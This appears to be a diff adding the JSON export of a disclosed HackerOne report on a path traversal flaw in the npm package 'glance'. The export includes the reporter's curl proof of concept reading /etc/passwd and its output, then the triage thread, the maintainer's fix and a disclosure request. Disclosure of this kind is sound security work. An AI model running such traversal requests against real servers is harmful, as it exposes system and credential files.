@@ -1,0 +1,612 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "muon4", 
+        "eveeez", 
+        "hassham", 
+        "khaledibnalwalid", 
+        "whitesector", 
+        "null-byte", 
+        "japz"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 310106, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-02-02T11:54:45.362Z", 
+    "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal vulnerability in ```glance``` module. This issue allows to read arbitrary files from the server, where ```glance``` is installed.\n\n## Module\n\n**glance**\n\na quick disposable http server for static files\n\nhttps://www.npmjs.com/package/glance\n\nStats\n33 downloads in the last day\n34 downloads in the last week\n269 downloads in the last month\n\n~3000 estimated downloads per year\n\n## Description\n\n```glance``` serves files from the server where was installed. No path sanitization is implemented, thus malicious user is able to read content of any file from the server using simple ```curl``` command (adjust number of ../ to reflect your system):\n\n```\ncurl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n```\n\nThe result:\n\n```\nme:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../../../etc/passwd HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< content-type: application/octet-stream\n< etag: 6d51e6677c898282619137b0c74f0cab\n< last-modified: Fri, 26 Jan 2018 12:04:19 +0000\n< content-length: 2559\n< Date: Mon, 29 Jan 2018 10:23:45 GMT\n< Connection: keep-alive\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n(..)\nguest-cz1ton:x:999:999:Guest:/tmp/guest-cz1ton:/bin/bash\npostgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n* Connection #0 to host 127.0.0.1 left intact\nme:~/playground/hackerone/Node$\n```\n\n## Steps To Reproduce:\n\n- install ```glance```:\n\n```\n$ npm install glance\n```\n\n- run ```glance``` in direcotry of your choice\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/\nglance serving node_modules/ on port 8080\n::1 read node_modules/\n::1 read node_modules/bash-color/\n::1 read node_modules/bash-color/README.md\n::1 read ./\n::1 read malware_frame.html\n::1 read malware.js\nERR404 ::ffff:127.0.0.1 on ../../../etc/passwd\nERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd\n::ffff:127.0.0.1 read ../../../../../etc/passwd\n::ffff:127.0.0.1 read ../../../../../etc/passwd\n```\n\nYou can see in the log above all my requests sent to ```glance```, including ```curl``` requests from PoC, where I was able to traverse directory tree and read content of ```/etc/passwd``` file\n\n## Supporting Material/References:\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to read content of arbitrary file from the server.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "high", 
+        "score": 8.6, 
+        "author_type": "Team"
+    }, 
+    "title": "[glance] Path Traversal in glance static file server allows to read content of arbitrary file", 
+    "is_member_of_team?": null, 
+    "vote_count": 7, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "glance", 
+        "max_severity": "critical", 
+        "databaseId": 6772, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-03-04T11:54:45.453Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2018-3715"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T13:27:51.667Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T13:27:51.667Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi\u00a0@bl4de, \n\nThanks a lot for reporting this to us.\nI quickly tried to reproduce your report but I'm hitting an error with the package:\n\n```\n./glance/node_modules/filed/main.js:33\n  this.mimetype = options.mimetype || mime.lookup(this.path.slice(this.path.lastIndexOf('.')+1))\n                                           ^\n\nTypeError: mime.lookup is not a function\n```\n", 
+            "markdown_message": "<p>Hi\u00a0@bl4de, </p>\n\n<p>Thanks a lot for reporting this to us.<br>\nI quickly tried to reproduce your report but I&#39;m hitting an error with the package:</p>\n<pre class=\"highlight plaintext\"><code>./glance/node_modules/filed/main.js:33\n  this.mimetype = options.mimetype || mime.lookup(this.path.slice(this.path.lastIndexOf(&#39;.&#39;)+1))\n                                           ^\n\nTypeError: mime.lookup is not a function\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2327245, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T13:32:49.556Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T13:32:49.556Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @lirantal \n\nIt seems that mime module was not installed in your ./node_modules folder.\nAll tests I am performed I start from removing old ./node_modules folder and install module I am going to test locally (without -g option) and then call tested module in this way:\n\n$ ./node_modules/PACKAE_NAME/bin/EXECUTABLE --option1 value --option2 value\n\n\nOr you can try install mime module, probably it has to be installed globally as well:\n$ npm install -g mime\n", 
+            "markdown_message": "<p>Hi <a href=\"/lirantal\">@lirantal</a> </p>\n\n<p>It seems that mime module was not installed in your ./node_modules folder.<br>\nAll tests I am performed I start from removing old ./node_modules folder and install module I am going to test locally (without -g option) and then call tested module in this way:</p>\n\n<p>$ ./node_modules/PACKAE_NAME/bin/EXECUTABLE --option1 value --option2 value</p>\n\n<p>Or you can try install mime module, probably it has to be installed globally as well:<br>\n$ npm install -g mime</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2327260, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T13:52:46.686Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T13:52:46.686Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I'm installing the module on a fresh new project locally, so nothing is installed globally. I did add the mime module just in case but same error. (we're on the same Node and npm versions).\n\nThe problem seems to be not with the mime module but the version it is using which maybe doesn't have the `lookup` function anymore... ?\n\n", 
+            "markdown_message": "<p>I&#39;m installing the module on a fresh new project locally, so nothing is installed globally. I did add the mime module just in case but same error. (we&#39;re on the same Node and npm versions).</p>\n\n<p>The problem seems to be not with the mime module but the version it is using which maybe doesn&#39;t have the <code>lookup</code> function anymore... ?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2327298, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T13:56:47.024Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T13:58:16.874Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hmm, that's really weird.\n\nJust did it once again and it works fine :/\n\nHere's what I've just done, command by command:\n\n```\nme:~/playground/hackerone/Node$ rm -rf node_modules/\nme:~/playground/hackerone/Node$ npm install glance\nnpm WARN saveError ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/Node/package.json'\nnpm WARN enoent ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/Node/package.json'\nnpm WARN Node No description\nnpm WARN Node No repository field.\nnpm WARN Node No README data\nnpm WARN Node No license field.\n\n+ glance@3.0.3\nadded 12 packages in 1.596s\nme:~/playground/hackerone/Node$ tree -L 1 node_modules/\nnode_modules/\n\u251c\u2500\u2500 abbrev\n\u251c\u2500\u2500 bash-color\n\u251c\u2500\u2500 filed\n\u251c\u2500\u2500 glance\n\u251c\u2500\u2500 html-ls\n\u251c\u2500\u2500 ls-stream\n\u251c\u2500\u2500 mime\n\u251c\u2500\u2500 nopt\n\u251c\u2500\u2500 through\n\u251c\u2500\u2500 utils-fs-exists\n\u2514\u2500\u2500 xtend\n\n11 directories, 0 files\nme:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/\nglance serving node_modules/ on port 8080\n\n```\n\nWorks fine:\n\n```\nme:~/playground/hackerone/Node$ curl -v http://127.0.0.1:8080\n* Rebuilt URL to: http://127.0.0.1:8080/\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET / HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< content-type: text/html;charset=utf-8\n< Date: Mon, 29 Jan 2018 13:57:50 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \n<ul>\n<li><a href=\".bin/\">.bin/</a></li>\n<li><a href=\"abbrev/\">abbrev/</a></li>\n<li><a href=\"bash-color/\">bash-color/</a></li>\n<li><a href=\"filed/\">filed/</a></li>\n<li><a href=\"glance/\">glance/</a></li>\n<li><a href=\"html-ls/\">html-ls/</a></li>\n<li><a href=\"ls-stream/\">ls-stream/</a></li>\n<li><a href=\"mime/\">mime/</a></li>\n<li><a href=\"nopt/\">nopt/</a></li>\n<li><a href=\"through/\">through/</a></li>\n<li><a href=\"utils-fs-exists/\">utils-fs-exists/</a></li>\n<li><a href=\"xtend/\">xtend/</a></li>\n</ul>\n* Connection #0 to host 127.0.0.1 left intact\nme:~/playground/hackerone/Node$ \n\n```\n\n\n", 
+            "markdown_message": "<p>Hmm, that&#39;s really weird.</p>\n\n<p>Just did it once again and it works fine :/</p>\n\n<p>Here&#39;s what I&#39;ve just done, command by command:</p>\n<pre class=\"highlight plaintext\"><code>me:~/playground/hackerone/Node$ rm -rf node_modules/\nme:~/playground/hackerone/Node$ npm install glance\nnpm WARN saveError ENOENT: no such file or directory, open &#39;/home/rafal.janicki/playground/hackerone/Node/package.json&#39;\nnpm WARN enoent ENOENT: no such file or directory, open &#39;/home/rafal.janicki/playground/hackerone/Node/package.json&#39;\nnpm WARN Node No description\nnpm WARN Node No repository field.\nnpm WARN Node No README data\nnpm WARN Node No license field.\n\n+ glance@3.0.3\nadded 12 packages in 1.596s\nme:~/playground/hackerone/Node$ tree -L 1 node_modules/\nnode_modules/\n\u251c\u2500\u2500 abbrev\n\u251c\u2500\u2500 bash-color\n\u251c\u2500\u2500 filed\n\u251c\u2500\u2500 glance\n\u251c\u2500\u2500 html-ls\n\u251c\u2500\u2500 ls-stream\n\u251c\u2500\u2500 mime\n\u251c\u2500\u2500 nopt\n\u251c\u2500\u2500 through\n\u251c\u2500\u2500 utils-fs-exists\n\u2514\u2500\u2500 xtend\n\n11 directories, 0 files\nme:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/\nglance serving node_modules/ on port 8080\n\n</code></pre>\n<p>Works fine:</p>\n<pre class=\"highlight plaintext\"><code>me:~/playground/hackerone/Node$ curl -v http://127.0.0.1:8080\n* Rebuilt URL to: http://127.0.0.1:8080/\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: 127.0.0.1:8080\n&gt; User-Agent: curl/7.47.0\n&gt; Accept: */*\n&gt; \n&lt; HTTP/1.1 200 OK\n&lt; content-type: text/html;charset=utf-8\n&lt; Date: Mon, 29 Jan 2018 13:57:50 GMT\n&lt; Connection: keep-alive\n&lt; Transfer-Encoding: chunked\n&lt; \n&lt;ul&gt;\n&lt;li&gt;&lt;a href=&quot;.bin/&quot;&gt;.bin/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;abbrev/&quot;&gt;abbrev/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;bash-color/&quot;&gt;bash-color/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;filed/&quot;&gt;filed/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;glance/&quot;&gt;glance/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;html-ls/&quot;&gt;html-ls/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;ls-stream/&quot;&gt;ls-stream/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;mime/&quot;&gt;mime/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;nopt/&quot;&gt;nopt/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;through/&quot;&gt;through/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;utils-fs-exists/&quot;&gt;utils-fs-exists/&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;xtend/&quot;&gt;xtend/&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n* Connection #0 to host 127.0.0.1 left intact\nme:~/playground/hackerone/Node$ \n\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2327308, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T14:04:31.884Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T14:04:31.884Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "can you show the output for `npm ls` ?", 
+            "markdown_message": "<p>can you show the output for <code>npm ls</code> ?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2327323, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T14:06:28.390Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T14:06:28.390Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Sure, here you go:\n\n```\nme:~/playground/hackerone/Node$ npm ls\n/home/rafal.janicki/playground/hackerone/Node\n\u2514\u2500\u252c glance@3.0.3\n  \u251c\u2500\u2500 bash-color@0.0.3\n  \u251c\u2500\u252c filed@0.1.0\n  \u2502 \u2514\u2500\u2500 mime@1.2.11\n  \u251c\u2500\u252c html-ls@1.0.0\n  \u2502 \u251c\u2500\u252c ls-stream@1.0.0\n  \u2502 \u2502 \u2514\u2500\u2500 through@2.2.7 extraneous\n  \u2502 \u2514\u2500\u2500 through@2.3.4\n  \u251c\u2500\u252c nopt@3.0.4\n  \u2502 \u2514\u2500\u2500 abbrev@1.1.1\n  \u251c\u2500\u2500 utils-fs-exists@1.0.1\n  \u2514\u2500\u2500 xtend@4.0.0\n\nnpm ERR! extraneous: through@2.2.7 /home/rafal.janicki/playground/hackerone/Node/node_modules/ls-stream/node_modules/through\nme:~/playground/hackerone/Node$ \n\n```", 
+            "markdown_message": "<p>Sure, here you go:</p>\n<pre class=\"highlight plaintext\"><code>me:~/playground/hackerone/Node$ npm ls\n/home/rafal.janicki/playground/hackerone/Node\n\u2514\u2500\u252c glance@3.0.3\n  \u251c\u2500\u2500 bash-color@0.0.3\n  \u251c\u2500\u252c filed@0.1.0\n  \u2502 \u2514\u2500\u2500 mime@1.2.11\n  \u251c\u2500\u252c html-ls@1.0.0\n  \u2502 \u251c\u2500\u252c ls-stream@1.0.0\n  \u2502 \u2502 \u2514\u2500\u2500 through@2.2.7 extraneous\n  \u2502 \u2514\u2500\u2500 through@2.3.4\n  \u251c\u2500\u252c nopt@3.0.4\n  \u2502 \u2514\u2500\u2500 abbrev@1.1.1\n  \u251c\u2500\u2500 utils-fs-exists@1.0.1\n  \u2514\u2500\u2500 xtend@4.0.0\n\nnpm ERR! extraneous: through@2.2.7 /home/rafal.janicki/playground/hackerone/Node/node_modules/ls-stream/node_modules/through\nme:~/playground/hackerone/Node$ \n\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2327325, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T19:25:06.244Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T19:25:06.244Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "@bl4de the difference is in the mime package version as I suspected, since in my install I get the following:\n\n```\n\u2514\u2500\u252c glance@3.0.3\n  \u251c\u2500\u2500 bash-color@0.0.3\n  \u251c\u2500\u252c filed@0.1.0\n  \u2502 \u2514\u2500\u2500 mime@2.2.0\n  \u251c\u2500\u252c html-ls@1.0.0\n  \u2502 \u251c\u2500\u252c ls-stream@1.0.0\n  \u2502 \u2502 \u2514\u2500\u2500 through@2.2.7\n  \u2502 \u2514\u2500\u2500 through@2.3.4\n  \u251c\u2500\u252c nopt@3.0.4\n  \u2502 \u2514\u2500\u2500 abbrev@1.1.1\n  \u251c\u2500\u2500 utils-fs-exists@1.0.1\n  \u2514\u2500\u2500 xtend@4.0.0\n```\n\nAnd indeed 2.x breaks some features like that `lookup` function.\nI will downgrade manually to mime 1.x and re-test.", 
+            "markdown_message": "<p><a href=\"/bl4de\">@bl4de</a> the difference is in the mime package version as I suspected, since in my install I get the following:</p>\n<pre class=\"highlight plaintext\"><code>\u2514\u2500\u252c glance@3.0.3\n  \u251c\u2500\u2500 bash-color@0.0.3\n  \u251c\u2500\u252c filed@0.1.0\n  \u2502 \u2514\u2500\u2500 mime@2.2.0\n  \u251c\u2500\u252c html-ls@1.0.0\n  \u2502 \u251c\u2500\u252c ls-stream@1.0.0\n  \u2502 \u2502 \u2514\u2500\u2500 through@2.2.7\n  \u2502 \u2514\u2500\u2500 through@2.3.4\n  \u251c\u2500\u252c nopt@3.0.4\n  \u2502 \u2514\u2500\u2500 abbrev@1.1.1\n  \u251c\u2500\u2500 utils-fs-exists@1.0.1\n  \u2514\u2500\u2500 xtend@4.0.0\n</code></pre>\n<p>And indeed 2.x breaks some features like that <code>lookup</code> function.<br>\nI will downgrade manually to mime 1.x and re-test.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2328461, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T19:26:49.055Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T19:26:49.055Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.\nI will invite the package maintainer to this issue. ", 
+            "markdown_message": "<p>I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.<br>\nI will invite the package maintainer to this issue. </p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2328467, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-29T19:39:15.258Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-29T19:39:15.258Z", 
+            "actor": {
+                "username": "reed", 
+                "url": "/reed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "cve_ids": [
+                "CVE-2018-3715"
+            ], 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::CveIdAdded", 
+            "id": 2328506, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-31T22:09:16.551Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-31T22:09:16.551Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High (8.6)", 
+                "old_severity": "High"
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 2340404, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-01T05:19:36.764Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T05:19:36.764Z", 
+            "actor": {
+                "username": "jarofghosts", 
+                "url": "/jarofghosts", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 2340997, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-01T05:22:11.596Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T05:22:11.596Z", 
+            "actor": {
+                "username": "jarofghosts", 
+                "url": "/jarofghosts", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Thanks for contacting me about this issue. I [committed a fix](https://github.com/jarofghosts/glance/commit/8cfd88e44ebd3f07e3a2eaf376a3e758b6c4ca19) and have published glance@3.0.4 that includes this fix. I have also `npm deprecate`d all versions below 3.0.4 with a note that that version fixes said vulnerability.", 
+            "markdown_message": "<p>Thanks for contacting me about this issue. I <a href=\"/redirect?signature=05ae7badeb0a691267273d5e6e544e5619e038e5&amp;url=https%3A%2F%2Fgithub.com%2Fjarofghosts%2Fglance%2Fcommit%2F8cfd88e44ebd3f07e3a2eaf376a3e758b6c4ca19\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>committed a fix</span><i class=\"icon-external-link\"></i></a> and have published <a title=\"glance@3.0.4\" href=\"mailto:glance@3.0.4\" rel=\"nofollow noopener noreferrer\">glance@3.0.4</a> that includes this fix. I have also <code>npm deprecate</code>d all versions below 3.0.4 with a note that that version fixes said vulnerability.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2340998, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-01T11:08:32.592Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T11:08:32.592Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @jarofghosts \n\nThanks for quick response.\nPretty neat fix! :) \n\n@lirantal  - I can't reproduce issue anymore. Looks resolved to me.\n\nbl4de", 
+            "markdown_message": "<p>Hi <a href=\"/jarofghosts\">@jarofghosts</a> </p>\n\n<p>Thanks for quick response.<br>\nPretty neat fix! :) </p>\n\n<p><a href=\"/lirantal\">@lirantal</a>  - I can&#39;t reproduce issue anymore. Looks resolved to me.</p>\n\n<p>bl4de</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2341548, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-01T22:16:59.532Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T22:16:59.532Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Great! Thanks for the quick response on this @jarofghosts and for validating @bl4de!\n\nare you both ok with a full public disclosure for this report? we'll publicly disclose it within 45 days since it was triaged per the policy (https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md)\n", 
+            "markdown_message": "<p>Great! Thanks for the quick response on this <a href=\"/jarofghosts\">@jarofghosts</a> and for validating <a href=\"/bl4de\">@bl4de</a>!</p>\n\n<p>are you both ok with a full public disclosure for this report? we&#39;ll publicly disclose it within 45 days since it was triaged per the policy (<a title=\"https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md\" href=\"/redirect?signature=cc8875bfb45005b588379ebd8a15c78090295bf8&amp;url=https%3A%2F%2Fgithub.com%2Fnodejs%2Fsecurity-wg%2Fblob%2Fmaster%2Fprocesses%2Fthird_party_vuln_process.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md</span><i class=\"icon-external-link\"></i></a>)</p>\n", 
+            "type": "Activities::Comment", 
